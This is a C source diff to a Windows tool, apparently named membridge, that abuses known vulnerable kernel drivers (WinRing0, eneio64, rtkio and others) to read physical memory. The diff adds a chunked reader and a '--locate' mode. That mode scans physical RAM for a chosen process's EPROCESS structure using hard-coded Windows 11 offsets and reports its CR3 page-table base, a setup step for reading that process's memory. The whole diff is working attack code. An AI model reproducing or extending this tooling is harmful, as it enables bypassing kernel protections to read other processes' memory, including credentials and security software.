@@ -803,6 +803,63 @@ static int backend_read(HANDLE dev, layout_t ly, uint64_t pa, uint32_t size, uin
     return 0;
 }
 
+static int backend_read_big(HANDLE dev, layout_t ly, uint64_t pa, uint32_t size, uint8_t *out) {
+    uint32_t done = 0;
+    while (done < size) {
+        uint32_t chunk = size - done;
+        if (chunk > 0x100000) chunk = 0x100000;
+        if (backend_read(dev, ly, pa + done, chunk, out + done)) {
+            done += chunk;
+            continue;
+        }
+        if (chunk > 0x10000 && backend_read(dev, ly, pa + done, 0x10000, out + done)) {
+            done += 0x10000;
+            continue;
+        }
+        if (chunk > 0x1000 && backend_read(dev, ly, pa + done, 0x1000, out + done)) {
+            done += 0x1000;
+            continue;
+        }
+        return 0;
+    }
+    return 1;
+}
+
+// Physical EPROCESS scan: find PID + ImageFileName, read DirectoryTableBase.
+// Win11 26200 offsets: DTB +0x28, PID +0x1D0, ImageFileName +0x338.
+static int locate_scan_cr3(HANDLE dev, layout_t ly, uint32_t pid, const char *name,
+                           uint64_t scan_start, uint64_t scan_size,
+                           uint64_t *out_cr3, uint64_t *out_eproc) {
+    const uint32_t chunk = 0x100000;
+    if (!name || !name[0] || scan_size < 0x1000) return 0;
+    uint8_t *buf = (uint8_t *)malloc(chunk);
+    if (!buf) return 0;
+    size_t nlen = strlen(name);
+    if (nlen > 15) nlen = 15;
+    uint64_t end = scan_start + scan_size;
+    int found = 0;
+    for (uint64_t pa = scan_start; pa < end && !found; pa += chunk) {
+        uint32_t want = (uint32_t)((end - pa) < chunk ? (end - pa) : chunk);
+        if (want < 0x1000) break;
+        if (!backend_read_big(dev, ly, pa, want, buf)) continue;
+        for (uint32_t off = 0; off + 0x338 + nlen + 1 <= want; off++) {
+            if (memcmp(buf + off + 0x338, name, nlen) != 0) continue;
+            uint64_t dtb = 0;
+            uint32_t vpid = 0;
+            memcpy(&dtb, buf + off + 0x28, 8);
+            memcpy(&vpid, buf + off + 0x1D0, 4);
+            if (vpid != pid) continue;
+            if (!dtb || (dtb & 0xFFF) || dtb >= (1ull << 48)) continue;
+            *out_cr3 = dtb;
+            if (out_eproc) *out_eproc = pa + off;
+            found = 1;
+            break;
+        }
+    }
+    free(buf);
+    return found;
+}
+
 static void hexdump(const uint8_t *p, int n) {
     for (int i = 0; i < n; i++) {
         if (i % 16 == 0) wprintf(L"  %04X: ", i);
@@ -840,6 +897,8 @@ static void usage(void) {
     wprintf(L"  membridge --list\n");
     wprintf(L"  membridge --backend <id> --pa <hex> --size <n> [--expect <ascii>] [--dump] [--keep]\n");
     wprintf(L"               [--driver-path <path>] [--no-load] [--out-file <path>]\n");
+    wprintf(L"  membridge --backend <id> --locate --pid <pid> --name <exe> --scan-start <hex> --scan-size <hex>\n");
+    wprintf(L"               (physical scan for EPROCESS -> CR3; Win11 26200 offsets)\n");
     wprintf(L"  membridge --device <\\\\.\\NAME> --layout <cchwapi|cchwapi_ext|sjtwinio|ufu|winring0|hp_swtools|rtkio|eneio64|glckio2|gibepext|fastdump|directio|tdeio|icachex|mrt>\n");
     wprintf(L"               --pa <hex> --size <n> [--expect <ascii>] [--dump]\n\n");
     wprintf(L"Backends (64-bit PA capable: *):\n");
@@ -850,6 +909,10 @@ static void usage(void) {
 
 int wmain(int argc, wchar_t **argv) {
     const wchar_t *backend = NULL, *driver_override = NULL, *device = NULL, *layout = NULL, *out_file = NULL;
+    const wchar_t *locate_name = NULL;
+    uint32_t locate_pid = 0;
+    uint64_t scan_start = 0, scan_size = 0;
+    int locate = 0, have_scan = 0;
     const char *expect = NULL;
     uint64_t pa = 0;
     uint32_t size = 0x100;
@@ -874,11 +937,20 @@ int wmain(int argc, wchar_t **argv) {
         else if (_wcsicmp(argv[i], L"--keep") == 0) keep = 1;
         else if (_wcsicmp(argv[i], L"--no-load") == 0) no_load = 1;
         else if (_wcsicmp(argv[i], L"--out-file") == 0 && i + 1 < argc) out_file = argv[++i];
+        else if (_wcsicmp(argv[i], L"--locate") == 0) locate = 1;
+        else if (_wcsicmp(argv[i], L"--pid") == 0 && i + 1 < argc) locate_pid = (uint32_t)wcstoul(argv[++i], NULL, 0);
+        else if (_wcsicmp(argv[i], L"--name") == 0 && i + 1 < argc) locate_name = argv[++i];
+        else if (_wcsicmp(argv[i], L"--scan-start") == 0 && i + 1 < argc) { scan_start = _wcstoui64(argv[++i], NULL, 0); have_scan = 1; }
+        else if (_wcsicmp(argv[i], L"--scan-size") == 0 && i + 1 < argc) { scan_size = _wcstoui64(argv[++i], NULL, 0); have_scan = 1; }
         else { wprintf(L"[ERR] unknown arg: %ls\n", argv[i]); usage(); return 6; }
     }
     if (argc <= 1) { usage(); return 6; }
-    if (!have_pa) { wprintf(L"[ERR] --pa required\n"); return 6; }
-    if (size == 0 || size > 0x10000) { wprintf(L"[ERR] --size out of range (1..0x10000)\n"); return 6; }
+    if (!have_pa && !locate) { wprintf(L"[ERR] --pa required (or use --locate)\n"); return 6; }
+    if (!locate && (size == 0 || size > 0x10000)) { wprintf(L"[ERR] --size out of range (1..0x10000)\n"); return 6; }
+    if (locate && (!locate_pid || !locate_name || !have_scan || scan_size < 0x1000)) {
+        wprintf(L"[ERR] --locate needs --pid <pid> --name <exe> --scan-start <hex> --scan-size <hex>\n");
+        return 6;
+    }
 
     if (device && layout) {
         g_manual = 1;
@@ -958,6 +1030,25 @@ int wmain(int argc, wchar_t **argv) {
         return 3;
     }
     wprintf(L"DEVICE=%ls\n", g_have_bk ? g_bk.device : g_manual_device);
+    if (locate) {
+        char name_a[64];
+        int n = WideCharToMultiByte(CP_ACP, 0, locate_name, -1, name_a, sizeof(name_a), NULL, NULL);
+        if (n <= 0) { CloseHandle(dev); if (!keep) cleanup(); free(out); return 6; }
+        uint64_t cr3 = 0, eproc = 0;
+        int ok = locate_scan_cr3(dev, g_have_bk ? g_bk.layout : g_manual_layout,
+                                 locate_pid, name_a, scan_start, scan_size, &cr3, &eproc);
+        CloseHandle(dev);
+        if (!keep) cleanup();
+        free(out);
+        if (!ok) {
+            wprintf(L"VERDICT=LOCATE_FAILED\n");
+            return 5;
+        }
+        wprintf(L"PID=%u\nEPROCESS_PA=0x%llX\nCR3=0x%llX\n",
+                locate_pid, (unsigned long long)eproc, (unsigned long long)cr3);
+        wprintf(L"VERDICT=PASS\n");
+        return 0;
+    }
     wprintf(L"PA=0x%llX\nSIZE=0x%X\n", (unsigned long long)pa, size);
     int ok = backend_read(dev, g_have_bk ? g_bk.layout : g_manual_layout, pa, size, out);
     CloseHandle(dev);
